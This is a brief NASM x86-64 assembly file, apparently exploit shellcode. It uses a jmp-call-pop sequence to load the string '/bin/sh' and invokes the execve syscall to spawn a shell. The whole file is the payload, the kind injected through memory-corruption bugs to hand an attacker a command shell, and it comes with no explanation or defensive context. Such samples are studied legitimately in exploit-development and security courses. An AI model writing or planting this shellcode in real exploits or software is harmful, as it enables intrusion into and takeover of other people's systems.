[BITS 64]

EXECVE	equ 59

segment .text
	global _start

_start:	jmp _call
_back:	pop rdi
	xor rax, rax
	push rax
	push rdi
	lea rsi, [rsp]
	mov al, EXECVE
	xor rdx, rdx
	syscall
_call:	call _back
	db "/bin/sh",0
